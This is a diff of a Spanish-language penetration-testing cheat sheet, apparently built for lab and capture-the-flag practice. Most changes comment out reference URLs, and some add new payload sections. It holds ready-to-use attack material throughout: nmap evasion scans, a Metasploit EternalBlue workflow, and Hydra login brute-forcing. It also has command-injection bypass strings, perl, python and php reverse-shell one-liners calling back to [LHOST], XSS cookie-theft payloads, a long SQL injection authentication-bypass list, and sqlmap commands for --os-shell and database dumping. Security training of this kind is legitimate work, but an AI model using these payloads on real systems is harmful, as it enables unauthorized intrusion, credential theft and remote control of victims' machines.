@@ -89,7 +89,7 @@ ________________________________________________________________________________
 	sudo nmap -vv -sV --mtu 16 --source-port 443 --spoof-mac 81:49:fd:8a:46:51 [RHOST]
 	sudo nmap -vv -sV -f -sS -D 8.8.8.8,20.20.20.20,192.168.54.20,24.132.225.31 [RHOST]
 
-https://nmap.org/man/es/index.html
+# https://nmap.org/man/es/index.html
 
 
 FTP 20/21
@@ -167,7 +167,7 @@ ________________________________________________________________________________
 	set [nombre campo] [dato]
 # Lanzar herramienta
 	run
-# ex:
+# Ex:
 	search ms17-010
 	use exploit/windows/smb/ms17_010_eternalblue
 	options
@@ -183,14 +183,14 @@ WITHOUT METASPLOIT
 _________________________________________________________________________________________
 
 # Buscar exploits:
-https://www.exploit-db.com/
-https://sploitus.com/
+# https://www.exploit-db.com/
+# https://sploitus.com/
 
 # Busqueda exploits en Kali. Es espejo de exploit-db.com.
 	sudo apt update && apt -y install exploitdb
 	searchsploit MS17-010
 	searchsploit -m 422315
-https://acortar.link/searchsploit
+# https://acortar.link/searchsploit
 
 # GitHub > code > copiar reco
 	git clone https://github.com/d4t4s3c/Win7Blue.git
@@ -220,8 +220,8 @@ https://acortar.link/searchsploit
 
 
 # Repositorios de diccionarios
-https://github.com/danielmiessler/SecLists
-https://github.com/hackingyseguridad/diccionarios/tree/master
+# https://github.com/danielmiessler/SecLists
+# https://github.com/hackingyseguridad/diccionarios/tree/master
 
 # Kali
 	/usr/share/wordlists/   ---   ubicacion de dicc
@@ -232,7 +232,7 @@ HASH
 _________________________________________________________________________________________
 
 # Hash identifier / verifier WEB
-https://hashes.com/en/decrypt/hash
+# https://hashes.com/en/decrypt/hash
 
 # Hash identifier Kali
 	hash-identifier
@@ -304,7 +304,7 @@ A09:2021-Security Logging and Monitoring Failures*
 A10:2021-Server-Side Request Forgery*
 	*From the Survey
 
-https://owasp.org/www-project-top-ten/
+# https://owasp.org/www-project-top-ten/
 
 
 
@@ -358,7 +358,7 @@ LINKFINDER
 _________________________________________________________________________________________
 
 # Enumera los link de la pagina web, la descargamos e instalamos.
-	https://github.com/GerbenJavado/LinkFinder
+# https://github.com/GerbenJavado/LinkFinder
 	git clone https://github.com/GerbenJavado/LinkFinder.git
 	cd LinkFinder
 	python setup.py install
@@ -403,14 +403,14 @@ ________________________________________________________________________________
 
 	ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "host:FUZZ.empline.thm" -u 'http://empline.thm/' -fs 14058
 
-	https://dnsdumpster.com/
+# https://dnsdumpster.com/
 
 
 WEBCHECK
 _________________________________________________________________________________________
 
 # Herramienta web que enumera gran cantidad de informacion
-	https://web-check.xyz/
+# https://web-check.xyz/
 
 
 CURL
@@ -423,11 +423,11 @@ ________________________________________________________________________________
 # Informacion banner grabbing web
 	curl -IL https://www.test.com
 
-https://www.keycdn.com/support/popular-curl-examples
-https://osint.com.ar/domina-curl-con-esta-guia-esencial-de-comandos/
-https://github.com/frizb/HackingWithCurl
-https://www.stationx.net/curl-cheat-sheet/
-https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc
+# https://www.keycdn.com/support/popular-curl-examples
+# https://osint.com.ar/domina-curl-con-esta-guia-esencial-de-comandos/
+# https://github.com/frizb/HackingWithCurl
+# https://www.stationx.net/curl-cheat-sheet/
+# https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc
 
 
 ZAPROXY
@@ -478,7 +478,8 @@ ________________________________________________________________________________
 
 # HYDRA # La informacion la sacamos del inspector en Network, al lanzar la peticion. Header y Cookie. Hay que sacar mensaje de fallo en el login.
 	hydra -L user.txt -P rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
-	ex:
+
+# Ex:
 	hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low:F=Username and/or password incorrect' 
 	hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
 	hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
@@ -488,6 +489,7 @@ ________________________________________________________________________________
 COMMAND INJECTION
 _________________________________________________________________________________________
 
+# Cuando se puede introducir comandos del sistema.
 # Tras introducir el valor que espera se realizan los comandos para evadirlo y hacer un bypass.
 	[VALUE]; whoami
 	[VALUE] && whoami
@@ -503,18 +505,125 @@ ________________________________________________________________________________
 		perl -e 'use Socket;$i="[LHOST]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHOST]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 		php -r '$sock=fsockopen("[LHOST]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-	https://gist.github.com/IN4G4I/a230443081c705836534138d8df99098
-	https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
+# https://gist.github.com/IN4G4I/a230443081c705836534138d8df99098
+# https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
 
 
 XSS
 _________________________________________________________________________________________
 
+# Cuando se puede inyectar codigo en JavaScript
 
+# XSS DOM #
+# Comprobar si es subceptible al XSS probar
+	<script>alert(prueba);</script>
+# Extraer las
+	<script>alert(document.cookie);</script>
+	#<script>alert(document.cookie);</script>
+	" ></option></select><img src=x onerror="alert(document.cookie)">
+
+# XSS Reflected #
+
+# XSS Stored #
 
 SQLi
 _________________________________________________________________________________________
 
+# Cuando se puede introducir consultas SQL
+# Para comprobar si es susceptible a SQLi, lo primero es probar a introducir una comilla simple.
+	'   ---   You have an error in your SQL syntax....
+	'or '1'='1   ---   Te montraria toda la tabla.
+
+# Otras opciones
+	admin' or '1'='1
+	" or "1"="1
+	" or "1"="1"--
+	" or "1"="1"/*
+	" or "1"="1"#
+	" or 1=1
+	" or 1=1-
+	") or "1"="1
+	") or "1"="1"--
+	") or "1"="1"/*
+	") or "1"="1"#
+	") or ("1"="1
+	") or ("1"="1"--
+	") or ("1"="1"/*
+	") or ("1"="1"#
+	) or '1`='1-
+
+# Eludir la autenticación.
+	'-'
+	' '
+	'&'
+	'^'
+	'*'
+	' or 1=1 limit 1 -- -+
+	'="or'
+	' or ''-'
+	' or '' '
+	' or ''&'
+	' or ''^'
+	' or ''*'
+	or true--
+	" or true--
+	' or true--
+	") or true--
+	') or true--
+	' or 'x'='x
+	') or ('x')=('x
+	')) or (('x'))=(('x
+	or 2 like 2
+	or 1=1/*
+	admin' --
+	admin' -- -
+	admin' #
+	admin'/*
+	admin') or ('2' LIKE '2
+	admin') or ('2' LIKE '2'#
+	admin') or ('2' LIKE '2'/*
+	admin' or '1'='1
+	admin' or '1'='1'--
+	admin' or '1'='1'#
+	admin' or '1'='1'/*
+	admin'or 1=1 or ''='
+	admin' or 1=1
+	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+	1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+	' UNION SELECT user, password FROM users#
+	1 or 1=1 UNION SELECT user, password FROM users#
+
+
+SQLi # SQLMAP
+_________________________________________________________________________________________
+
+# Sin BurpSuite, pueden dar problemas por las cookies.
+	sqlmap -u http://[IP] --cookie [COOKIE] -p [PARAMETER]
+	ex: sqlmap -u http://10.10.145.198/vulnerabilities/sqli/ --cookie m8b54ha53ujhv6on8omkcg0tf2 -p id
+	sqlmap -u http://[IP] –os-shell
+	sqlmap -u http://[IP] –dump
+	sqlmap -u http://[IP]/?id=1 --dbs
+	sqlmap -u http://[IP]/?id=1 -D [DATABASE-NAME] --tables
+	sqlmap -u http://[IP]/?id=1 -D [DATABASE-NAME] -T [TABLE-NAME] --columns
+	sqlmap -u http://[IP]/?id=1 -D [DATABASE-NAME] -T [TABLE-NAME] -C [DATO1],[DATO2],[DATO3] --dump-all
+
+# Con BurpSuite, generar las consultas que desvelan el SQLi para que aparezcan en Proxy > HTTP history
+# Boton derecho en Reqest > Save item y nombrar como request.req
+	sqlmap -r request.req -p [PARAMETER-VULN] --batch --dbs
+	sqlmap -r request.req -D [DATABASE-NAME] --tables
+	sqlmap -r request.req -D [DATABASE-NAME] -T [TABLE-NAME] --columns
+	sqlmap -r request.req -D [DATABASE-NAME] -T [TABLE-NAME] -C [DATO1],[DATO2],[DATO3] --dump
+
+# Ex:
+	sqlmap -r request.req -p id --batch --dbs
+	sqlmap -r request.req -D dvwa --tables
+	sqlmap -r request.req -D dvwa -T users --columns 
+	sqlmap -r request.req -D dvwa -T users -C user,first_name,password --dump
+# En este paso si estan encriptadas las pass te lo intenta desencriptar, indicar un dicc.
+	> /usr/share/wordlists/rockyou.txt
+
+# https://hackersonlineclub.com/sql-injection-cheatsheet/
 
 
 CSRF
@@ -567,7 +676,7 @@ ________________________________________________________________________________
 
 
 
-https://cpdos.org/
+# https://cpdos.org/
 
 
 
